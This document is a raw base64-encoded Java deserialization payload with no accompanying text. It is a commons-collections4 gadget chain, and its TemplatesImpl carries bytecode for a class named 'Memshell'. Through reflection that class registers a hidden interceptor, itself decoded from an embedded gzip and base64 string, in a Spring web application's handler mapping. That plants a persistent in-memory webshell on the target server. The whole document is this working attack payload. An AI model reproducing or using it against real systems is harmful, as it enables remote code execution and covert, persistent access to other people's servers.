YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAALr7K/rq+AAAAMQGWAQAITWVtc2hlbGwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQANZ2V0VXJsUGF0dGVybgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMTWVtc2hlbGw7AQACLyoIAAwBAAxnZXRDbGFzc05hbWUBAAhJbmplY3RvcggADwEAD2dldEJhc2U2NFN0cmluZwEACkV4Y2VwdGlvbnMBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwATAQAQamF2YS9sYW5nL1N0cmluZwcAFQEQgEg0c0lBQUFBQUFBQUFJMVlDWHdVMVIzKy90bE5ack9zZ0FtQ0FUa1Z5TDJBNFVxQ2toQ1FRQktPWUREZ05kbE1rb1hON3JKSFNFUkF2Q2hlZUxmMnNIZXhyYllJc2tta0tqMnNyZmF3cDcxUGU5dVczdHFxOUhzenM4UG1RUGdCTTIvZisxL3YrNS9EaTI4Ly9TeUErZkt3d0ZNZjNtWUVFcEdZQmhGY3NFM3YwZjBoUGR6cFh4SFM0L0dHaU41dThNZ2xXQnlKZGZyajBWZ3czTmtSMDd1Tm5aSFlkdjlPbzgwZk4ySTlJU1BocjRuM2hRT3I5WEI3eUlqVmh4TkdMR0JFVGJuWmdwenFZRGlZdUV6Z0tpeHFFYmhYUk5vTndiaUdZTmhvU25hM0diRk5lbHVJTzNrTmtZQWVhdEZqUWZYYjNuUW51b0p4Z2JjaGJXb1ZEZkpCZzhlTHNSZ25tRnpZTUtyZFZVcVgzQ0NZZElaekplUjhKV1FDYVU2VE5DZlVMV3VUd1pCNStZbTJya200a01aRXlhNE1IVTVPWVpNeEpSZFp1SWozMWFOUkk5d3VLQ3NjU1ZnMFlzdFdSUkhUTUYwcG1rR2t0aHQ5UHN5eVJGN3NuTXlteXhJUmkwMHdvWENrTUVxWmkwSkZXMFFwM2UwTEJYUE95UW95bHFEVVMzVmxhbVVxOWhQQURZeUx3cTIxUmNOQnJCSmtCZHI0MkZvckdOTnVkTkNiNWdIQkpIMTkvVWdPSHhaaWtRSjhNZVgyQ2pUU2JTbFMvUG1uU1ZmMnFzZ0pSc0lhcUVJQ1ZHOEs2dlVIWW4wTUtmK0tZTFNMYU5FWlBYcXNJbjA4akZteDBoTHA1cjh0R2lwc0ZjT0VhRmdwT0s4NW9RZTJOK3BSTytCY05TdWJQVmpOUzNVYWlmcHdQS0dIQTl3dU9pT0t3eTN6WVEzV2VyRUtEWUxwUXdqaVVTUGdiellDTVNPeDF1aHI1aThOVFk2YjF3dkdEMWVoWVNOZFRrTnEreElHTCtRdUpGNCtiTUtWWGpTanhiUlR3VDJLYlMwcWNGdTlXSWN0NUZNWnFFanJMY3E0RVVqR2dvaytQKzB3U2EvR05jcmthK21WOXNpcVlGZ1BNWTZWMzVXNjY2R3JRM283TnhvenJDd1h0QmZhMTAvWGdLNUVJdXBmelVlenRiSFIySkUwNG9tcXM1TEZvNUZ3M0tqS3VNUzZOcFhzVlVVMGZjYnBYY3NiaWFDdVhKd1JLQjFEcVVJaG8xTVAxUVFDUmp5ZVFkWEZXT2dZbXJ5MkdoN3dQcGtPM21oMGhIZ1M3REhXUlkzWVVIMVZLc05qc1hWSkFqcmQ0Z2xHL01wQk5iR1kzc2Y5YURKQkx4aDZOMG0xT0swZ0YwMDhNdzRtaFFycGRqMmhreWRtSVNlWWU0NFFNMGhpTm96cGk1d0Q0TlRVWlpWc3diUjNOazRERTNiMk9SbWpnVVYzenJtWm9PSEdJVkZ2T1VUREhzSFVkMFJXdzAyMmtyTTdUTVBOYkNCZGhxcjZUV3hlUHR4cVpkeHRER2ptMW1yenhJZjlLQjJEWFhpWGMzNkhzM2NYeTRFbG9FVVBKU25oSG92aUlJRVBSTUlKUFJobWRrNFowb3E2OUZpelFvVGxnNEhzdzMyNFh5WHRBN1NGU3B2VFlUR3JzT2hzZ2VIRFEzaFltZkZ1cDgwOEl2QlJ5bnBkZGVPRXN2NTlscVh2NTUzYUZsWFVHUUd6eTA0Y3JXeXBuSDRVSDFURi9rTStMRVdsV24yRTBSRFYrMEpzamg1OHpCSmZreUJIV3pKaG5MMkwyS25rd3lkd2FBejY4SmdwUkpVdXV5dmtGNDdXRVQ2Tng3M1lpeWM0RHd3NzFQQlp3ZGcwdjlXekJRVWpwVGp0L0VrYzhlSXdqdHFOUFF2SGZKaVBCV3JWei92RWg5eG43aWozR2FVQXNUUU80bWwxb2VQMFd6UU5kOXlEWit5VFhYak9IaEgyNGZPOHRJUEFseGd6WVdQbjZSWXl0Rjg3Z0gwWkx5aXp2OEpSSmlPZWs2eHozVVpHREw4b3VERFQ1azFkc2NoTzFiTHNVdjgxTDE3QzExbWJHSE42S0s3YTltZ0YxWWR2NG1VRitiZWMxWGVzTk5qTWhxQWducFEyazdtM25yallCN1QwZS9qK0dPekdLODZBOEVOeXhwTnRjWHNnbVZnNHRPMDdrOFdQOFJNVitqOU5kL3Foa2pYOFhKQzlVNjJIV1ozUnkzNkpYM254Qy96YW5tLzI0amVPUGI4ajBJbUlVeVo4K0lOcWovdndSeWUyWDZQNzIvUzRzYWhpWlRpZEYwTm5Hc2ZVditDdml1T2tvL0h2anA1L092Zit0N0x6VEZkOVhWMzFEWWYvZjR3Yng0MTB5OVJoSGJpUlNhNTNHblhCVHF1UXV6Z2Q4TmxZdDlERHZvUXA3MEN0U1paZy9wa1Q4d3c2T0tDSTJ5c3V5VTVQRXFJeGJrSkd1RFBSWlU3cDlUN0pGYTg2R01PRFpKUnR5YkRtTlRxNHhTZm55VmpGeitsN2dxbW9XMDkwK1d1RG5Xcnk3NlJENVh5eXRadmFmSkpQRlNTZW9BYUtlcUt1b2xVbWVpVlBKaWxudnE1V0JhWUxyK1RjSEZ0QlAvbGtpbkp5czNDYTFpeVhNVEJ6TEJjS3poOWxHRlhUNENLT28yMkVPTHRIRldtN3NaUW5FOEZRZWEzSjZwRkxLTEFqWXJZQjlyT3oxRFM3U01rY21jc01sVUtyY3R2MmVLU1l3OFRXRWVTYWxGcjUxR2drdWlMOENsZytpcGFSYkpsNlkxWXo4MXNTYUVDNStKVUI4NWcvVzBjbXRTWUxXQnZPeEs0SkVjc0pobnNpMjNubHBhTVVoVkZFamxhb1pKRXM5c3BDV1pLdTJsTEpBbTJZYUd5eVAwbzhVdTFZZTVuRHNaejVGaytHeTd1RDhVQjViVTN6eW5RZUVzUmFCOTY2ZENtVVZZNkcxYXFlbWFRZVdlTklibkFrTjZsNTFiQkZYZUtJMm1oNXFpNTlzc2xoYlhGWXIzS1ViRkhCYWxoS3JuWW9yM1Vvcng5cHZpTzV6ZEhaN3BqZjRVaG1OdmtzeWJYSmpnNUZ2ODJSSDNMa2N3andWQWRDNWtkeSttdFRkcVJidmNUVG4zK1NUSDhyeUU1bnJ5Lzl3U2U3MGw5d3NqdGRxR1N2QjVNZFFaeUN4bDhhV0dUTWExdWlMdzNNWDdoZ1FZWHVrVnNkb2Jmelk2aTNqSVlZNFVTWm1rUTk0c3hDY2djTFEyOXZyMGZ1U2c4L2NrL20rWDJaSnc5aUpxdWttK1VyQjluSVZkWUE4Q2hEelBjczh5MksxM3pmWTc1enVlTHQrY3pscnhwS0VMN3ppL3N4dmpoZkRoeVRPL202KzVnY2ZKTGJXZkR5cVVvMWNCSHlNQlZqdVBKWkxIeWZad3JtSUdDTEM1RlMwYzRyTHVuSEJSUjA3ekc1bjY4SGpzbER4ekdwdFI4RlJ6QTFoWmxIY0VrS2MxSW9Ia0Q1VWN3N3JXc3NYSHpPb1BTWjhQTUtTdDlFUzZhdFQ2M3llSzdxTmdjUFcvTXlBcUdvY290TFhDWFA5bVBKWVVka2ptbnVuQXhSdVk2b1hGeUtDbE1VbTVndDZoVnl1UGt1eWFzZlFHTlQyVVdQUUhNZmdqdjdPTmExSHNHR0ZEYm5YZFdQclNsY1YxYVNRdUJ3a3h3MlZUQkVVRTM3dmFhaWJENUxLYXFNdHlqbmlSOUZ0RndaVWNHekhPNHV3MldrTHFKSmwyTzVlZThTeDdBU3VxYkNsRnFDV3F3Z3pSVmNVL29waklOYlE1YUdPdEg0dmFnZXAzaVV1Y2ZGS2ptRlNYRFptNHFxbXRMYVlWQVNMNW5sTTBNR09GbFMvQlJ1SDhTQkxDYldxK3JIbllPNE93dGMzSnZDZzQvZzVaSkJ2RWRRNlM0NWd2Y080Z05aR01DSEs3T0xDN0pkS1h5ME1ydkFuZmZ4UVh3eUN5OWdGdGVmT282czF1SVVQcFBDVS8xSUZXU25NRENJejdsd0NMZVc1RDFia0QySUV5NGN4ejdHd2hjcWM4anh4VUU4bjRVVE9KekNWeXUxUXhoWDZUbU9sMW9MUFAzNHhuTUZXa0ZPQ3QvZVhLQVI2ZTl1TGgzRUR3Ukg4Q1BYK1BFcC9DeUZWd3UwRkg2cjluOHZLRmEwZjNLbjhPY0IvQzJGZjNEM1g0cjZQNHI0dnltODZYcmMvVGp2dndjSGNUODY3WGZROXRoR1RPQnpFZU51TVgyeWhNK2w5RW9sR2xDRjdmUlZrdDdhUTY4Y1JCMjVhdkVndmZJb1ZuSVF2UUpQWURXZVF6MmV4eHJPSm12eEdobzU0Nnd6dmQxQjZRZXBZeHVsYU9UeU1rdTZtWUI3RU9hZkNDUGhVVFRacDBXVUVNVU9odDlpOUNObVJncDk1RVRGU2NTUk1LUGlKTzNwTVlQNUpIYVMxMlhHeHlKa3Y0WHRHdnJvOUZNTWVjMzAveTROdXpYc3RiWTF6bXlNaGx2ZXhCanV2WUhHTnlqdkxSVkFmRmViWmFUVVRvVEh1T2N5L3hleklWOWtRSElhUzR0VDRuSHg0VXZKK09PUzErb3VUY2tGL1hJaEVaYkpLWm5hd0R4cExGSHBrRVZCNVU0NlRPUGx3RGtvQ3kwVXZabnBjUlhQdDVDaWxZbXgxUVJxQm1sem1SYTFlTnU4Mkh5Q1BjWE1ZajlPY1NYbUZmT1JkWXBzdkZZei8xcUJUVFpPbEZaa1M1TlpEb0hkeXVyWkExTFVXSm92SlhKQ3lsSXl2NVR2UzFPeXRJay9xdkpsbWZzWkhHNTE1ZFUxcCtUeU12N1kyK29xNXJybUJKcDVsYXFtZkZreElDc2JlY3NyS3QwRjdwVFU1OHZhREtiR0F2ZHByblVXVnpaejViQlpDSmN6UktvWkxqMzhVRWtqc1lET0JLN2phUnZORGJDa3RwTXVSRXFEbEowTW5pNXNZRkQyMEtsOURJdGREQmFGem1vaU9CVVh5elRUMmJtb2xPa3lnMUkyWUxhNTV5Wm51YjFYaDhVeTB5NHB1MlVXdzBpaHVFc3VkbEFzVW9Wa2hWa2MwaWlld2tKVlJNemZaclhnWTNoczhIdldSbm1MamZJQmhmS0dBV2xXS0Y5cG9ielpScmxWb2J3MVg2NnhBV3NtUnRkbG9LeWZRSjMxbDZqVkVPdkFnQmdLNjA0TDYyQytiTTlnN2M3RU9wTEpleHJ4VlV6Q2FpYmh6Ymh0R09JN2VKcWs2VDFFY1NmcDlwS3lsNVEzRU1GZGpNZ2J5Yk9IWEx1eG54bHlHdkVpV1c4anZ0eEdkek5LekQwM09TdnN2VFZZNWlCK1FHYlpjYnVmaUZka0lsNXZ4MjJkalhpVlF0ejhQVHJpSG9rNnJYcWxtUlFVbEMvN2pzb3QrWExiVWRsdk5sV0pIWkZFU25xT1NHOUtia2pKalFPeTU2amM5S1Rabk5NTjNJY0NOcUhKd1A4QjlSMXpYNXNZQUFBPQgAFwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAGQAaCgAWABsBAAMoKVYBAAdjb250ZXh0AQASTGphdmEvbGFuZy9PYmplY3Q7AQALaW50ZXJjZXB0b3IHAAMMABkAHQoAIQAiAQAKZ2V0Q29udGV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAAkACUKAAIAJgEADmdldEludGVyY2VwdG9yDAAoACUKAAIAKQEADmFkZEludGVyY2VwdG9yAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWDAArACwKAAIALQEAE2phdmEvbGFuZy9FeGNlcHRpb24HAC8BABFyZXF1ZXN0QXR0cmlidXRlcwEAC2h0dHByZXF1ZXN0AQAHc2Vzc2lvbgEADnNlcnZsZXRDb250ZXh0AQATYXBwbGljYXRpb25Db250ZXh0cwEAGUxqYXZhL3V0aWwvTGlua2VkSGFzaFNldDsBABJhcHBsaWNhdGlvbkNvbnRleHQBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwA6AQAQamF2YS9sYW5nL09iamVjdAcAPAEADVN0YWNrTWFwVGFibGUBABBqYXZhL2xhbmcvVGhyZWFkBwA/AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DABBAEIKAEAAQwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAEUARgoAQABHAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyCABJAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwASwBMCgA7AE0BABRnZXRSZXF1ZXN0QXR0cmlidXRlcwgATwEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABRAFIKAAIAUwEACmdldFJlcXVlc3QIAFUMAFEAUgoAAgBXAQAKZ2V0U2Vzc2lvbggAWQwAUQBSCgACAFsBABFnZXRTZXJ2bGV0Q29udGV4dAgAXQwAUQBSCgACAF8BAEJvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnN1cHBvcnQuV2ViQXBwbGljYXRpb25Db250ZXh0VXRpbHMIAGEMAEsATAoAOwBjAQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0CABlAQAPamF2YS9sYW5nL0NsYXNzBwBnAQAcamF2YXguc2VydmxldC5TZXJ2bGV0Q29udGV4dAgAaQwASwBMCgA7AGsBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAFEAbQoAAgBuAQAxb3JnLnNwcmluZ2ZyYW1ld29yay5jb250ZXh0LnN1cHBvcnQuTGl2ZUJlYW5zVmlldwgAcAwASwBMCgA7AHIBAAtuZXdJbnN0YW5jZQwAdAAlCgBoAHUIADUBAAVnZXRGVgwAeABSCgACAHkBABdqYXZhL3V0aWwvTGlua2VkSGFzaFNldAcAewEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAfQB+CgB8AH8BABJqYXZhL3V0aWwvSXRlcmF0b3IHAIEBAARuZXh0DACDACULAIIAhAEANW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQuV2ViQXBwbGljYXRpb25Db250ZXh0CACGDABLAEwKADsAiAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAigCLCgA9AIwBABBpc0Fzc2lnbmFibGVGcm9tAQAUKExqYXZhL2xhbmcvQ2xhc3M7KVoMAI4AjwoAaACQAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAJIBACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwCUAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAlgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCYAQATamF2YS9sYW5nL1Rocm93YWJsZQcAmgEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247DABBAEIKAEAApAwARQBGCgBAAKYMAA4ABgoAAgCoDABLAEwKADsAqgwAdAAlCgBoAKwMABEABgoAAgCuAQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAsACxCgACALIBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAtAC1CgACALYIAJ4HAJ0BABFqYXZhL2xhbmcvSW50ZWdlcgcAugEABFRZUEUMALwAoQkAuwC9DAC8AKEJALsAvwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAwQDCCgBoAMMBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAMUBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAxwDICgDGAMkBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwAywDMCgC7AM0MAMsAzAoAuwDPAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADRANIKAMYA0wwAdAAlCgBoANUBABZhYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQATYWRhcHRlZEludGVyY2VwdG9ycwEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAClMamF2YS91dGlsL0FycmF5TGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAB2dldEJlYW4IANwBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nCADeDABRAG0KAAIA4AgA2AwAeABSCgACAOMBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwDlAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDADnAOgKAOYA6QEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCADxAQAHZm9yTmFtZQwA8wBMCgBoAPQBAAxkZWNvZGVCdWZmZXIIAPYBAAlnZXRNZXRob2QMAPgAwgoAaAD5DAB0ACUKAGgA+wwA0QDSCgDGAP0BABBqYXZhLnV0aWwuQmFzZTY0CAD/DADzAEwKAGgBAQEACmdldERlY29kZXIIAQMMAPgAwgoAaAEFDADRANIKAMYBBwwAigCLCgA9AQkBAAZkZWNvZGUIAQsMAPgAwgoAaAENDADRANIKAMYBDwEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAAFJAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HARsBABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtBwEdAQAdamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW0HAR8MABkAHQoBHAEhAQAFKFtCKVYMABkBIwoBHgEkAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAZASYKASABJwEABHJlYWQBAAUoW0IpSQwBKQEqCgEgASsBAAV3cml0ZQEAByhbQklJKVYMAS0BLgoBHAEvAQALdG9CeXRlQXJyYXkBAAQoKVtCDAExATIKARwBMwEABXNldEZWAQA5KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAEdmFyMAEABHZhcjEBAAN2YWwBAARnZXRGAQA/KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAE6ATsKAAIBPAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwE+AQADc2V0DAFAACwKAT8BQQEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBOgE7CgACAUcMAMcAyAoBPwFJAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAUsBTAoBPwFNAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwFPAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsMAIoAiwoAPQFSAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBVAFVCgBoAVYMAMcAyAoB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